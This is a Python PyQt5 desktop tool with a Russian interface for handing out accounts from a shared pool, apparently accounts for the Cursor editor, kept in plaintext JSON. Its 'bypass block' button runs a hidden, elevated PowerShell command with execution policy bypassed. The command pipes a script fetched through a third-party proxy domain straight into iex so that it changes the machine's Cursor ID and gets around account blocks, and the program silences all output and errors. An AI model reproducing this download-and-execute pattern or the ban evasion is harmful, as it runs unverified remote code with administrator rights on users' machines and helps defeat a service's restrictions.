import sys
import json
import os
import webbrowser
import subprocess
from PyQt5.QtWidgets import (QApplication, QMainWindow, QPushButton, QVBoxLayout, QHBoxLayout, 
                            QWidget, QLabel, QLineEdit, QDialog, QMessageBox, QTabWidget, 
                            QScrollArea, QFormLayout, QGroupBox, QDialogButtonBox, QFrame, QStackedWidget)
from PyQt5.QtCore import Qt, QSize, pyqtSignal
from PyQt5.QtGui import QIcon, QFont, QClipboard, QPalette, QColor
import warnings
warnings.filterwarnings("ignore")
MODERN_STYLE = """
    /* Глобальные стили */
    QMainWindow {
        background-color: #121212;
    }
    QWidget {
        background-color: #121212;
        color: #f5f5f5;
        font-family: 'Segoe UI', 'Arial', sans-serif;
        font-size: 15px;
    }
    QLabel {
        color: #f5f5f5;
        font-size: 15px;
    }
    QLabel[heading="true"] {
        font-size: 22px;
        font-weight: bold;
        margin-bottom: 15px;
        color: #ffffff;
    }
    /* Кнопки навигации */
    QPushButton[navbutton="true"] {
        background-color: #1f1f1f;
        color: #e0e0e0;
        border: none;
        border-radius: 6px;
        padding: 12px 18px;
        font-size: 16px;
        font-weight: bold;
        margin: 5px;
    }
    QPushButton[navbutton="true"]:hover {
        background-color: #2d2d2d;
    }
    QPushButton[navbutton="true"]:pressed {
        background-color: #3a3a3a;
    }
    QPushButton[navbutton="true"]:checked {
        background-color: #1a237e;
        color: white;
        border-radius: 6px;
    }
    /* Основные кнопки */
    QPushButton {
        background-color: #1976d2;
        color: white;
        border: none;
        border-radius: 6px;
        padding: 10px 18px;
        font-size: 15px;
        font-weight: bold;
        min-height: 36px;
    }
    QPushButton:hover {
        background-color: #1565c0;
    }
    QPushButton:pressed {
        background-color: #0d47a1;
    }
    QPushButton:disabled {
        background-color: #424242;
        color: #757575;
    }
    /* Кнопки действий */
    QPushButton[actionbutton="true"] {
        background-color: #2196f3;
        color: white;
        padding: 8px 14px;
    }
    QPushButton[actionbutton="true"]:hover {
        background-color: #1976d2;
    }
    /* Кнопка "Получить аккаунт" */
    QPushButton[getaccount="true"] {
        background-color: #2e7d32;
        color: white;
        border: none;
        border-radius: 8px;
        padding: 18px;
        font-size: 18px;
        margin: 10px 0;
    }
    QPushButton[getaccount="true"]:hover {
        background-color: #388e3c;
    }
    QPushButton[getaccount="true"]:pressed {
        background-color: #1b5e20;
    }
    /* Кнопки копирования */
    QPushButton[copybutton="true"] {
        background-color: #00897b;
        color: white;
        padding: 8px 14px;
        margin: 5px;
        font-size: 15px;
    }
    QPushButton[copybutton="true"]:hover {
        background-color: #00796b;
    }
    /* Кнопка сохранения */
    QPushButton[savebutton="true"] {
        background-color: #f57c00;
        color: white;
        padding: 6px 12px;
    }
    QPushButton[savebutton="true"]:hover {
        background-color: #ef6c00;
    }
    QPushButton[savebutton="true"]:disabled {
        background-color: #424242;
        color: #757575;
    }
    /* Кнопка удаления */
    QPushButton[deletebutton="true"] {
        background-color: #d32f2f;
        color: white;
    }
    QPushButton[deletebutton="true"]:hover {
        background-color: #c62828;
    }
    /* Кнопка сброса */
    QPushButton[resetbutton="true"] {
        background-color: #7b1fa2;
        color: white;
    }
    QPushButton[resetbutton="true"]:hover {
        background-color: #6a1b9a;
    }
    /* Специальные кнопки */
    QPushButton[specialbutton="true"] {
        background-color: #5e35b1;
        color: white;
        padding: 14px;
        font-size: 16px;
        margin: 10px 0;
    }
    QPushButton[specialbutton="true"]:hover {
        background-color: #512da8;
    }
    /* Контейнеры */
    QGroupBox {
        background-color: #1f1f1f;
        border: 1px solid #333333;
        border-radius: 8px;
        padding: 15px;
        margin-top: 20px;
        font-weight: bold;
    }
    QGroupBox::title {
        subcontrol-origin: margin;
        left: 10px;
        padding: 0 5px;
        color: #bbdefb;
    }
    /* Карточки аккаунтов */
    QGroupBox[accountcard="true"] {
        background-color: #1f1f1f;
        border: 1px solid #333333;
        border-radius: 8px;
        padding: 18px;
        margin: 8px 0;
        font-size: 15px;
    }
    QGroupBox[accountcard="true"]:hover {
        border-color: #2196f3;
        background-color: #212121;
    }
    /* Scroll Areas */
    QScrollArea {
        background-color: #121212;
        border: none;
    }
    QScrollBar:vertical {
        background-color: #1a1a1a;
        width: 12px;
        margin: 0px;
    }
    QScrollBar::handle:vertical {
        background-color: #424242;
        min-height: 30px;
        border-radius: 6px;
    }
    QScrollBar::handle:vertical:hover {
        background-color: #616161;
    }
    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
        height: 0px;
    }
    QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
        background: none;
    }
    /* Диалоги */
    QDialog {
        background-color: #121212;
        color: #f5f5f5;
    }
    /* Поля ввода */
    QLineEdit {
        background-color: #1f1f1f;
        border: 1px solid #333333;
        border-radius: 6px;
        padding: 10px;
        color: #f5f5f5;
        selection-background-color: #2196f3;
        font-size: 15px;
        min-height: 36px;
    }
    QLineEdit:focus {
        border-color: #2196f3;
    }
    /* Виджет с вкладками */
    QTabWidget::pane {
        border: 1px solid #333333;
        border-radius: 6px;
        background-color: #1f1f1f;
    }
    QTabBar::tab {
        background-color: #212121;
        color: #e0e0e0;
        border-top-left-radius: 6px;
        border-top-right-radius: 6px;
        padding: 8px 12px;
        min-width: 80px;
    }
    QTabBar::tab:selected {
        background-color: #1f1f1f;
        border-bottom: 2px solid #2196f3;
    }
    QTabBar::tab:hover:!selected {
        background-color: #2a2a2a;
    }
    /* Статистика */
    QLabel[statsLabel="true"] {
        background-color: #1f1f1f;
        padding: 12px;
        border-radius: 6px;
        border: 1px solid #333333;
        color: #e0e0e0;
        font-size: 16px;
    }
"""
class NullWriter:
    def write(self, arg):
        pass
    def flush(self):
        pass
class AccountCard(QGroupBox):
    reset_status = pyqtSignal(str)  
    delete_account = pyqtSignal(str)  
    def __init__(self, email, password, used=False, parent=None):
        super().__init__(parent)
        self.email = email
        self.password = password
        self.used = used
        self.setTitle("")
        self.setProperty("accountcard", True)
        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        # Информация аккаунта
        info_container = QWidget()
        info_layout = QVBoxLayout(info_container)
        info_layout.setContentsMargins(0, 0, 0, 0)
        info_layout.setSpacing(10)
        # Устанавливаем крупный шрифт для информации аккаунта
        font = QFont()
        font.setPointSize(16)
        font.setBold(True)
        email_layout = QHBoxLayout()
        email_label = QLabel(f"<b>Email:</b> {email}")
        email_label.setFont(font)
        email_layout.addWidget(email_label)
        email_layout.addStretch()
        copy_email_btn = QPushButton("Копировать")
        copy_email_btn.setProperty("copybutton", True)
        copy_email_btn.setMinimumHeight(36)
        copy_email_btn.clicked.connect(lambda: self.copy_to_clipboard(email))
        email_layout.addWidget(copy_email_btn)
        password_layout = QHBoxLayout()
        password_label = QLabel(f"<b>Пароль:</b> {password}")
        password_label.setFont(font)
        password_layout.addWidget(password_label)
        password_layout.addStretch()
        copy_password_btn = QPushButton("Копировать")
        copy_password_btn.setProperty("copybutton", True)
        copy_password_btn.setMinimumHeight(36)
        copy_password_btn.clicked.connect(lambda: self.copy_to_clipboard(password))
        password_layout.addWidget(copy_password_btn)
        info_layout.addLayout(email_layout)
        info_layout.addLayout(password_layout)
        layout.addWidget(info_container)
        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setFrameShadow(QFrame.Sunken)
        line.setStyleSheet("background-color: #333333; max-height: 1px; margin: 10px 0;")
        layout.addWidget(line)
        actions_layout = QHBoxLayout()
        actions_layout.addStretch()
        if used:
            reset_btn = QPushButton("Сбросить статус")
            reset_btn.setProperty("resetbutton", True)
            reset_btn.setMinimumHeight(36)
            reset_btn.clicked.connect(lambda: self.reset_status.emit(email))
            actions_layout.addWidget(reset_btn)
        delete_btn = QPushButton("Удалить")
        delete_btn.setProperty("deletebutton", True)
        delete_btn.setMinimumHeight(36)
        delete_btn.clicked.connect(lambda: self.confirm_delete())
        actions_layout.addWidget(delete_btn)
        layout.addLayout(actions_layout)
    def copy_to_clipboard(self, text):
        clipboard = QApplication.clipboard()
        clipboard.setText(text)
    def confirm_delete(self):
        reply = QMessageBox.question(
            self, 
            "Подтверждение удаления", 
            f"Вы уверены, что хотите удалить аккаунт {self.email}?",
            QMessageBox.Yes | QMessageBox.No, 
            QMessageBox.No
        )
        if reply == QMessageBox.Yes:
            self.delete_account.emit(self.email)
class AddAccountDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Добавить новый аккаунт")
        self.setMinimumWidth(450)
        layout = QVBoxLayout(self)
        layout.setSpacing(18)
        title_label = QLabel("Добавить новый аккаунт")
        title_label.setProperty("heading", True)
        title_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(title_label)
        form_layout = QFormLayout()
        form_layout.setSpacing(12)
        form_layout.setLabelAlignment(Qt.AlignRight)
        form_layout.setFormAlignment(Qt.AlignLeft)
        font = QFont()
        font.setPointSize(12)
        email_label = QLabel("Email:")
        email_label.setFont(font)
        self.email_input = QLineEdit()
        self.email_input.setPlaceholderText("Введите email")
        self.email_input.setMinimumHeight(40)
        form_layout.addRow(email_label, self.email_input)
        password_label = QLabel("Пароль:")
        password_label.setFont(font)
        self.password_input = QLineEdit()
        self.password_input.setPlaceholderText("Введите пароль")
        self.password_input.setMinimumHeight(40)
        form_layout.addRow(password_label, self.password_input)
        layout.addLayout(form_layout)
        buttons_layout = QHBoxLayout()
        buttons_layout.setSpacing(12)
        cancel_btn = QPushButton("Отмена")
        cancel_btn.setMinimumHeight(40)
        cancel_btn.clicked.connect(self.reject)
        buttons_layout.addWidget(cancel_btn)
        save_btn = QPushButton("Сохранить")
        save_btn.setProperty("savebutton", True)
        save_btn.setMinimumHeight(40)
        save_btn.clicked.connect(self.accept)
        buttons_layout.addWidget(save_btn)
        layout.addLayout(buttons_layout)
    def get_account_data(self):
        return {
            "email": self.email_input.text(),
            "password": self.password_input.text()
        }
class AccountManager(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Управление аккаунтами")
        self.setMinimumSize(800, 600)
        if os.path.exists("account_manager.ico"):
            self.setWindowIcon(QIcon("account_manager.ico"))
        self.setStyleSheet(MODERN_STYLE)
        self.accounts_file = "accounts.json"
        self.accounts = []
        self.load_accounts()
        self.setup_ui()
        self.has_active_account = False
    def setup_ui(self):
        central_widget = QWidget()
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(20)
        main_layout.setContentsMargins(20, 20, 20, 20)
        title_label = QLabel("Управление аккаунтами")
        title_label.setProperty("heading", True)
        title_label.setAlignment(Qt.AlignCenter)
        title_font = QFont()
        title_font.setPointSize(24)
        title_font.setBold(True)
        title_label.setFont(title_font)
        main_layout.addWidget(title_label)
        self.stats_label = QLabel()
        self.stats_label.setProperty("statsLabel", True)
        self.stats_label.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(self.stats_label)
        self.update_stats_label()
        nav_frame = QFrame()
        nav_frame.setStyleSheet("""
            QFrame {
                background-color: #1a1a1a;
                border-radius: 8px;
            }
        """)
        nav_layout = QHBoxLayout(nav_frame)
        nav_layout.setSpacing(8)
        nav_layout.setContentsMargins(10, 10, 10, 10)
        self.nav_buttons = []
        get_account_btn = QPushButton("Получение аккаунта")
        get_account_btn.setProperty("navbutton", True)
        get_account_btn.setCheckable(True)
        get_account_btn.setChecked(True)
        get_account_btn.clicked.connect(lambda: self.change_section(0))
        nav_layout.addWidget(get_account_btn)
        self.nav_buttons.append(get_account_btn)
        used_accounts_btn = QPushButton("Использование аккаунтов")
        used_accounts_btn.setProperty("navbutton", True)
        used_accounts_btn.setCheckable(True)
        used_accounts_btn.clicked.connect(lambda: self.change_section(1))
        nav_layout.addWidget(used_accounts_btn)
        self.nav_buttons.append(used_accounts_btn)
        all_accounts_btn = QPushButton("Все аккаунты")
        all_accounts_btn.setProperty("navbutton", True)
        all_accounts_btn.setCheckable(True)
        all_accounts_btn.clicked.connect(lambda: self.change_section(2))
        nav_layout.addWidget(all_accounts_btn)
        self.nav_buttons.append(all_accounts_btn)
        additional_btn = QPushButton("Дополнительно")
        additional_btn.setProperty("navbutton", True)
        additional_btn.setCheckable(True)
        additional_btn.clicked.connect(lambda: self.change_section(3))
        nav_layout.addWidget(additional_btn)
        self.nav_buttons.append(additional_btn)
        main_layout.addWidget(nav_frame)
        self.stacked_widget = QStackedWidget()
        main_layout.addWidget(self.stacked_widget)
        get_account_widget = QWidget()
        get_account_layout = QVBoxLayout(get_account_widget)
        get_account_layout.setSpacing(20)
        get_account_layout.setContentsMargins(10, 20, 10, 20)
        get_btn = QPushButton("Получить аккаунт")
        get_btn.setProperty("getaccount", True)
        get_btn.clicked.connect(self.get_unused_account)
        get_account_layout.addWidget(get_btn)
        self.result_group = QGroupBox("Полученный аккаунт")
        self.result_group.setVisible(False)  
        result_layout = QVBoxLayout(self.result_group)
        result_layout.setSpacing(15)
        result_font = QFont()
        result_font.setPointSize(16)
        result_font.setBold(True)
        self.result_email_label = QLabel()
        self.result_email_label.setFont(result_font)
        result_layout.addWidget(self.result_email_label)
        self.result_password_label = QLabel()
        self.result_password_label.setFont(result_font)
        result_layout.addWidget(self.result_password_label)
        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setFrameShadow(QFrame.Sunken)
        line.setStyleSheet("background-color: #333333; max-height: 1px;")
        result_layout.addWidget(line)
        copy_buttons_layout = QHBoxLayout()
        copy_buttons_layout.setSpacing(10)
        copy_email_btn = QPushButton("Копировать Email")
        copy_email_btn.setProperty("copybutton", True)
        copy_email_btn.clicked.connect(self.copy_result_email)
        copy_buttons_layout.addWidget(copy_email_btn)
        copy_password_btn = QPushButton("Копировать пароль")
        copy_password_btn.setProperty("copybutton", True)
        copy_password_btn.clicked.connect(self.copy_result_password)
        copy_buttons_layout.addWidget(copy_password_btn)
        self.save_btn = QPushButton("Сохранить")
        self.save_btn.setProperty("savebutton", True)
        self.save_btn.clicked.connect(self.save_current_account)
        self.save_btn.setEnabled(False)
        copy_buttons_layout.addWidget(self.save_btn)
        result_layout.addLayout(copy_buttons_layout)
        get_account_layout.addWidget(self.result_group)
        get_account_layout.addStretch()
        used_accounts_widget = QWidget()
        used_layout = QVBoxLayout(used_accounts_widget)
        used_layout.setSpacing(15)
        used_layout.setContentsMargins(10, 20, 10, 20)
        used_label = QLabel("Просмотренные/полученные аккаунты:")
        used_label.setProperty("heading", True)
        used_layout.addWidget(used_label)
        self.no_used_accounts_label = QLabel("Нет использованных аккаунтов")
        self.no_used_accounts_label.setAlignment(Qt.AlignCenter)
        self.no_used_accounts_label.setStyleSheet("color: #999; margin: 20px; font-size: 14px;")
        used_layout.addWidget(self.no_used_accounts_label)
        self.used_scroll_area = QScrollArea()
        self.used_scroll_area.setWidgetResizable(True)
        self.used_scroll_content = QWidget()
        self.used_scroll_layout = QVBoxLayout(self.used_scroll_content)
        self.used_scroll_layout.setSpacing(10)
        self.used_scroll_layout.addStretch()
        self.used_scroll_area.setWidget(self.used_scroll_content)
        used_layout.addWidget(self.used_scroll_area)
        all_accounts_widget = QWidget()
        all_layout = QVBoxLayout(all_accounts_widget)
        all_layout.setSpacing(15)
        all_layout.setContentsMargins(10, 20, 10, 20)
        all_header_layout = QHBoxLayout()
        all_label = QLabel("Все доступные аккаунты:")
        all_label.setProperty("heading", True)
        all_header_layout.addWidget(all_label)
        all_header_layout.addStretch()
        add_account_btn = QPushButton("Добавить аккаунт")
        add_account_btn.setProperty("actionbutton", True)
        add_account_btn.clicked.connect(self.show_add_account_dialog)
        all_header_layout.addWidget(add_account_btn)
        all_layout.addLayout(all_header_layout)
        self.all_scroll_area = QScrollArea()
        self.all_scroll_area.setWidgetResizable(True)
        self.all_scroll_content = QWidget()
        self.all_scroll_layout = QVBoxLayout(self.all_scroll_content)
        self.all_scroll_layout.setSpacing(10)
        self.all_scroll_layout.addStretch()
        self.all_scroll_area.setWidget(self.all_scroll_content)
        all_layout.addWidget(self.all_scroll_area)
        additional_widget = QWidget()
        additional_layout = QVBoxLayout(additional_widget)
        additional_layout.setSpacing(20)
        additional_layout.setContentsMargins(10, 20, 10, 20)
        additional_label = QLabel("Дополнительные функции:")
        additional_label.setProperty("heading", True)
        additional_layout.addWidget(additional_label)
        cards_layout = QVBoxLayout()
        cards_layout.setSpacing(15)
        bypass_card = QGroupBox()
        bypass_card.setProperty("accountcard", True)
        bypass_layout = QVBoxLayout(bypass_card)
        bypass_title = QLabel("Обойти блокировку")
        bypass_title.setStyleSheet("font-weight: bold; font-size: 16px; color: #bbdefb;")
        bypass_layout.addWidget(bypass_title)
        bypass_desc = QLabel("Запустить процесс обхода блокировки Cursor. Требуются права администратора.")
        bypass_desc.setWordWrap(True)
        bypass_layout.addWidget(bypass_desc)
        bypass_btn = QPushButton("Обойти блокировку")
        bypass_btn.setProperty("specialbutton", True)
        bypass_btn.setStyleSheet("""
            QPushButton {
                background-color: #d32f2f;
                color: white;
                padding: 12px;
                font-size: 14px;
                font-weight: bold;
                border-radius: 6px;
                border: none;
            }
            QPushButton:hover {
                background-color: #b71c1c;
            }
            QPushButton:pressed {
                background-color: #7f0000;
            }
        """)
        bypass_btn.clicked.connect(lambda: self.open_repository())
        bypass_layout.addWidget(bypass_btn)
        cards_layout.addWidget(bypass_card)
        register_card = QGroupBox()
        register_card.setProperty("accountcard", True)
        register_layout = QVBoxLayout(register_card)
        register_title = QLabel("Регистрация в Cursor")
        register_title.setStyleSheet("font-weight: bold; font-size: 16px; color: #bbdefb;")
        register_layout.addWidget(register_title)
        register_desc = QLabel("Перейти на официальную страницу регистрации в сервисе Cursor.")
        register_desc.setWordWrap(True)
        register_layout.addWidget(register_desc)
        register_btn = QPushButton("Перейти к регистрации")
        register_btn.setProperty("specialbutton", True)
        register_btn.clicked.connect(lambda: webbrowser.open("https://authenticator.cursor.sh/"))
        register_layout.addWidget(register_btn)
        cards_layout.addWidget(register_card)
        cards_layout.addStretch()
        additional_layout.addLayout(cards_layout)
        self.stacked_widget.addWidget(get_account_widget)
        self.stacked_widget.addWidget(used_accounts_widget)
        self.stacked_widget.addWidget(all_accounts_widget)
        self.stacked_widget.addWidget(additional_widget)
        self.setCentralWidget(central_widget)
        self.refresh_account_lists()
    def change_section(self, index):
        for i, btn in enumerate(self.nav_buttons):
            btn.setChecked(i == index)
        self.stacked_widget.setCurrentIndex(index)
    def load_accounts(self):
        if os.path.exists(self.accounts_file):
            try:
                with open(self.accounts_file, 'r', encoding='utf-8') as file:
                    self.accounts = json.load(file)
            except Exception as e:
                QMessageBox.critical(self, "Ошибка", f"Не удалось загрузить аккаунты: {str(e)}")
                self.accounts = []
        else:
            self.accounts = []
            self.save_accounts()
    def save_accounts(self):
        try:
            with open(self.accounts_file, 'w', encoding='utf-8') as file:
                json.dump(self.accounts, file, indent=4)
        except Exception as e:
            QMessageBox.critical(self, "Ошибка", f"Не удалось сохранить аккаунты: {str(e)}")
    def update_stats_label(self):
        unused_count = sum(1 for account in self.accounts if not account['used'])
        total_count = len(self.accounts)
        self.stats_label.setText(f"Доступно аккаунтов: <b>{unused_count}</b> из <b>{total_count}</b>")
    def refresh_account_lists(self):
        self.clear_layout(self.used_scroll_layout)
        self.clear_layout(self.all_scroll_layout)
        used_accounts = [account for account in self.accounts if account['used']]
        if used_accounts:
            self.no_used_accounts_label.setVisible(False)
            self.used_scroll_area.setVisible(True)
        else:
            self.no_used_accounts_label.setVisible(True)
            self.used_scroll_area.setVisible(False)
        for account in self.accounts:
            all_card = AccountCard(
                account['email'], 
                account['password'], 
                account['used']
            )
            all_card.reset_status.connect(self.reset_account_status)
            all_card.delete_account.connect(self.delete_account)
            self.all_scroll_layout.insertWidget(0, all_card)
            if account['used']:
                used_card = AccountCard(
                    account['email'], 
                    account['password'], 
                    account['used']
                )
                used_card.reset_status.connect(self.reset_account_status)
                used_card.delete_account.connect(self.delete_account)
                self.used_scroll_layout.insertWidget(0, used_card)
        self.used_scroll_layout.addStretch()
        self.all_scroll_layout.addStretch()
        self.update_stats_label()
    def clear_layout(self, layout):
        while layout.count() > 1:  
            item = layout.takeAt(0)
            if item.widget():
                item.widget().deleteLater()
    def get_unused_account(self):
        for i, account in enumerate(self.accounts):
            if not account['used']:
                self.result_email_label.setText(f"<b>Email:</b> {account['email']}")
                self.result_password_label.setText(f"<b>Пароль:</b> {account['password']}")
                self.result_group.setVisible(True)
                self.save_btn.setEnabled(True)
                self.current_account_index = i
                self.result_email = account['email']
                self.result_password = account['password']
                self.has_active_account = True
                return
        QMessageBox.warning(self, "Предупреждение", "Все аккаунты уже использованы!")
        self.result_group.setVisible(False)
        self.save_btn.setEnabled(False)
        self.has_active_account = False
    def save_current_account(self):
        if hasattr(self, 'current_account_index') and self.has_active_account:
            self.accounts[self.current_account_index]['used'] = True
            self.save_accounts()
            self.refresh_account_lists()
            self.result_group.setVisible(False)
            self.save_btn.setEnabled(False)
            self.has_active_account = False
            self.stacked_widget.setCurrentIndex(1)
    def show_add_account_dialog(self):
        dialog = AddAccountDialog(self)
        if dialog.exec_() == QDialog.Accepted:
            account_data = dialog.get_account_data()
            if not account_data['email'] or not account_data['password']:
                QMessageBox.warning(self, "Предупреждение", "Пожалуйста, заполните все поля!")
                return
            self.accounts.append({
                'email': account_data['email'],
                'password': account_data['password'],
                'used': False
            })
            self.save_accounts()
            self.refresh_account_lists()
    def reset_account_status(self, email):
        for i, account in enumerate(self.accounts):
            if account['email'] == email:
                self.accounts[i]['used'] = False
                self.save_accounts()
                self.refresh_account_lists()
                return
    def delete_account(self, email):
        self.accounts = [account for account in self.accounts if account['email'] != email]
        self.save_accounts()
        self.refresh_account_lists()
    def copy_result_email(self):
        if hasattr(self, 'result_email'):
            QApplication.clipboard().setText(self.result_email)
    def copy_result_password(self):
        if hasattr(self, 'result_password'):
            QApplication.clipboard().setText(self.result_password)
    def open_repository(self):
        try:
            powershell_command = "irm https://aizaozao.com/accelerate.php/https://raw.githubusercontent.com/yuaotian/go-cursor-help/refs/heads/master/scripts/run/cursor_win_id_modifier.ps1 | iex"
            command = f'powershell.exe -Command "Start-Process powershell -ArgumentList \'-NoProfile -ExecutionPolicy Bypass -Command {powershell_command}\' -Verb RunAs -WindowStyle Hidden"'
            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except Exception as e:
            pass
if __name__ == "__main__":
    sys.stdout = NullWriter()
    sys.stderr = NullWriter()
    os.environ["QT_LOGGING_RULES"] = "*.debug=false;qt.*.debug=false"
    app = QApplication(sys.argv)
    app.setApplicationName("AccountManager")
    app.setOrganizationName("AccountManager")
    app.setOrganizationDomain("accountmanager.local")
    if os.path.exists("account_manager.ico"):
        app.setWindowIcon(QIcon("account_manager.ico"))
    app.setStyle("Fusion")
    dark_palette = QPalette()
    dark_palette.setColor(QPalette.Window, QColor(18, 18, 18))
    dark_palette.setColor(QPalette.WindowText, Qt.white)
    dark_palette.setColor(QPalette.Base, QColor(25, 25, 25))
    dark_palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
    dark_palette.setColor(QPalette.ToolTipBase, Qt.black)
    dark_palette.setColor(QPalette.ToolTipText, Qt.white)
    dark_palette.setColor(QPalette.Text, Qt.white)
    dark_palette.setColor(QPalette.Button, QColor(53, 53, 53))
    dark_palette.setColor(QPalette.ButtonText, Qt.white)
    dark_palette.setColor(QPalette.BrightText, Qt.red)
    dark_palette.setColor(QPalette.Link, QColor(42, 130, 218))
    dark_palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
    dark_palette.setColor(QPalette.HighlightedText, Qt.black)
    dark_palette.setColor(QPalette.Active, QPalette.Button, QColor(53, 53, 53))
    dark_palette.setColor(QPalette.Disabled, QPalette.ButtonText, QColor(127, 127, 127))
    dark_palette.setColor(QPalette.Disabled, QPalette.WindowText, QColor(127, 127, 127))
    dark_palette.setColor(QPalette.Disabled, QPalette.Text, QColor(127, 127, 127))
    dark_palette.setColor(QPalette.Disabled, QPalette.Light, QColor(53, 53, 53))
    app.setPalette(dark_palette)
    global_style = """
        QMessageBox {
            background-color: #1f1f1f;
            color: #ffffff;
            font-size: 15px;
        }
        QMessageBox QLabel {
            color: #ffffff;
            font-size: 15px;
        }
        QMessageBox QPushButton {
            background-color: #1976d2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 8px 16px;
            font-size: 15px;
            min-width: 90px;
            min-height: 36px;
        }
        QMessageBox QPushButton:hover {
            background-color: #1565c0;
        }
        QToolTip {
            background-color: #1f1f1f;
            color: #ffffff;
            border: 1px solid #333333;
            border-radius: 4px;
            padding: 6px;
            font-size: 14px;
        }
    """
    app.setStyleSheet(global_style)
    window = AccountManager()
    window.show()
    sys.exit(app.exec_()) 